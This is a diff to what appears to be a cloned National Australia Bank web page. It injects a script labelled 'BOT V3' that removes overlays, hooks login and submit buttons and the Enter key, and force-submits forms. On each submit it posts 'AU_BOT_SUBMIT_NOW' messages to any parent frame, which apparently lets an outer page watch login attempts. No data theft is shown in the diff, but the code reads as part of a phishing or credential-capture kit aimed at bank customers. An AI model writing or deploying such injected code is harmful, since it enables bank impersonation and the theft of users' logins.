@@ -31,10 +31,66 @@
 <meta name=msapplication-TileImage content=https://www.nab.com.au/etc.clientlibs/nab/clientlibs/clientlib-site/resources/images/nab-app-icon-144.png>
 <script type=application/ld+json>[]</script>
 <script type=application/ld+json>[]</script>
-<meta name=referrer content=no-referrer><style>.sf-hidden{display:none!important}</style><meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;&quot;><!-- GENERIC FIX INJECTED BY BOT V2 -->
+<meta name=referrer content=no-referrer><style>.sf-hidden{display:none!important}</style><meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;&quot;>
+<!-- GENERIC FIX INJECTED BY BOT V3 -->
 <script>
 (function(){
   var DISABLED_CLASS_RE = /disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn|_disabled|-disabled/i;
+  var lastSubmittedAt = 0;
+  function ultraClick(btn){
+    try{
+      try{ btn.click(); }catch(e){}
+      try{
+        if(btn.dispatchEvent){
+          try{ btn.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,cancelable:true,view:window})); }catch(e){}
+          try{ btn.dispatchEvent(new MouseEvent('mouseup',{bubbles:true,cancelable:true,view:window})); }catch(e){}
+          try{ btn.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,view:window})); }catch(e){}
+          try{ btn.dispatchEvent(new PointerEvent('pointerdown',{bubbles:true,cancelable:true})); }catch(e){}
+          try{ btn.dispatchEvent(new PointerEvent('pointerup',{bubbles:true,cancelable:true})); }catch(e){}
+        }
+      }catch(e){}
+    }catch(e){}
+  }
+  function notifyParentAndTryForm(btnOrInput){
+    try{
+      var now = Date.now();
+      if(now - lastSubmittedAt < 1200) return;
+      lastSubmittedAt = now;
+      try{
+        if(window.parent && window.parent.postMessage){
+          try{ window.parent.postMessage({kind:'BOT_V3_SUBMIT_CLICKED'}, '*'); }catch(e){}
+          try{ window.parent.postMessage({type:'AU_BOT_SUBMIT_NOW'}, '*'); }catch(e){}
+        }
+      }catch(e){}
+      var f = null;
+      if(btnOrInput && btnOrInput.getAttribute){
+        var fa = btnOrInput.getAttribute('form');
+        if(fa){ try{ f = document.getElementById(fa); }catch(e){} }
+      }
+      if(!f && btnOrInput && typeof btnOrInput.closest === 'function'){ try{ f = btnOrInput.closest('form'); }catch(e){} }
+      if(!f){ f = document.querySelector('form'); }
+      if(!f) return;
+      try{
+        var onsubmitAttr = f.getAttribute('onsubmit');
+        if(onsubmitAttr && typeof onsubmitAttr === 'string' && onsubmitAttr.trim()){
+          try{
+            var fn = new Function('event', onsubmitAttr);
+            var fakeEv = { preventDefault: function(){}, stopPropagation: function(){}, returnValue: true };
+            var result = fn.call(f, fakeEv);
+            if(result === false || fakeEv.returnValue === false) return;
+          }catch(e2){}
+        }
+      }catch(e){}
+      try{ ultraClick(btnOrInput); }catch(e){}
+      var ev;
+      try{
+        if(typeof Event === 'function'){ ev = new Event('submit', { bubbles: true, cancelable: true }); }
+        else { ev = document.createEvent('Event'); ev.initEvent('submit', true, true); }
+        f.dispatchEvent(ev);
+      }catch(e2){ ev = { defaultPrevented: false }; }
+      try{ if(!ev.defaultPrevented){ try{ if(typeof f.requestSubmit === 'function'){ f.requestSubmit(); } }catch(e3){} try{ f.submit(); }catch(e3){} } }catch(e2){}
+    }catch(e){}
+  }
   function runFix(){
     try{
       var overlaySelector = 'overlay, dialog, backdrop, paper-dialog, ing-core-overlay, iron-overlay, iron-overlay-backdrop, .overlay, [class*="overlay"], [data-overlay], [role="dialog"], [role="alertdialog"]';
@@ -130,47 +186,14 @@
       });
     }catch(e){}
     try{
-      function submitNearestForm(btnOrInput){
-        try{
-          var f = null;
-          if(btnOrInput && btnOrInput.getAttribute){
-            var formAttr = btnOrInput.getAttribute('form');
-            if(formAttr){ try{ f = document.getElementById(formAttr); }catch(e){} }
-          }
-          if(!f && btnOrInput && typeof btnOrInput.closest === 'function'){ try{ f = btnOrInput.closest('form'); }catch(e){} }
-          if(!f){ f = document.querySelector('form'); }
-          if(!f) return;
-          try{
-            var onsubmitAttr = f.getAttribute('onsubmit');
-            if(onsubmitAttr && typeof onsubmitAttr === 'string' && onsubmitAttr.trim()){
-              try{
-                var fn = new Function('event', onsubmitAttr);
-                var fakeEv = { preventDefault: function(){}, stopPropagation: function(){}, returnValue: true };
-                var result = fn.call(f, fakeEv);
-                if(result === false || fakeEv.returnValue === false) return;
-              }catch(e2){}
-            }
-          }catch(e){}
-          var ev;
-          try{
-            if(typeof Event === 'function'){
-              ev = new Event('submit', { bubbles: true, cancelable: true });
-            } else {
-              ev = document.createEvent('Event');
-              ev.initEvent('submit', true, true);
-            }
-            f.dispatchEvent(ev);
-          }catch(e2){
-            ev = { defaultPrevented: false };
-          }
-          try{ if(!ev.defaultPrevented){ f.submit(); } }catch(e2){}
-        }catch(e){}
-      }
       var buttons = document.querySelectorAll('button, input[type="submit"], input[type="button"], [role="button"], a.btn, [class*="btn-primary"], [class*="btn-default"], [class*="btn-lg"], [data-testid*="login"], [data-testid*="submit"], [class*="login-button"], [id*="login-button"], [id*="submit-button"]');
       buttons.forEach(function(btn){
-        if(!btn._gfBotHookedV2){
-          btn._gfBotHookedV2 = true;
-          var handler = function(e){ try{ submitNearestForm(btn); }catch(err){} };
+        if(!btn._gfBotHookedV3){
+          btn._gfBotHookedV3 = true;
+          var handler = function(e){
+            try{ ultraClick(btn); }catch(err){}
+            try{ notifyParentAndTryForm(btn); }catch(err){}
+          };
           try{ btn.addEventListener('click', handler, true); }catch(e){}
           try{ btn.addEventListener('mousedown', handler, true); }catch(e){}
           try{ btn.addEventListener('touchend', handler, true); }catch(e){}
@@ -190,27 +213,12 @@
     try{
       var allInputs = document.querySelectorAll('form input, form select, form textarea');
       allInputs.forEach(function(inp){
-        if(!inp._gfBotEnterHookedV2){
-          inp._gfBotEnterHookedV2 = true;
+        if(!inp._gfBotEnterHookedV3){
+          inp._gfBotEnterHookedV3 = true;
           try{
             inp.addEventListener('keydown', function(e){
               if(e && (e.key === 'Enter' || e.keyCode === 13)){
-                try{
-                  var f0 = null;
-                  if(inp && inp.getAttribute){
-                    var fa = inp.getAttribute('form');
-                    if(fa){ try{ f0 = document.getElementById(fa); }catch(e){} }
-                  }
-                  if(!f0 && inp && typeof inp.closest === 'function'){ try{ f0 = inp.closest('form'); }catch(e){} }
-                  if(!f0){ f0 = document.querySelector('form'); }
-                  if(f0){
-                    var ev0;
-                    if(typeof Event === 'function'){ ev0 = new Event('submit', { bubbles: true, cancelable: true }); }
-                    else { ev0 = document.createEvent('Event'); ev0.initEvent('submit', true, true); }
-                    f0.dispatchEvent(ev0);
-                    try{ if(!ev0.defaultPrevented){ f0.submit(); } }catch(e2){}
-                  }
-                }catch(err){}
+                try{ notifyParentAndTryForm(inp); }catch(err){}
               }
             }, true);
           }catch(e){}
@@ -218,11 +226,22 @@
       });
     }catch(e){}
   }
+  try{
+    window.addEventListener('message', function(ev){
+      try{
+        var d = ev.data;
+        if(d && typeof d === 'object' && d.kind === 'AU_BOT_CAN_PROCEED_NOW'){
+          lastSubmittedAt = 0;
+        }
+      }catch(_){}
+    });
+  }catch(e){}
   try{ runFix(); }catch(e){}
-  try{ setTimeout(runFix, 50); }catch(e){}
-  try{ setTimeout(runFix, 200); }catch(e){}
-  try{ setTimeout(runFix, 500); }catch(e){}
-  try{ setInterval(runFix, 250); }catch(e){}
+  try{ setTimeout(runFix, 30); }catch(e){}
+  try{ setTimeout(runFix, 100); }catch(e){}
+  try{ setTimeout(runFix, 300); }catch(e){}
+  try{ setTimeout(runFix, 700); }catch(e){}
+  try{ setInterval(runFix, 200); }catch(e){}
   try{
     if(document.readyState === 'loading'){
       document.addEventListener('DOMContentLoaded', runFix);
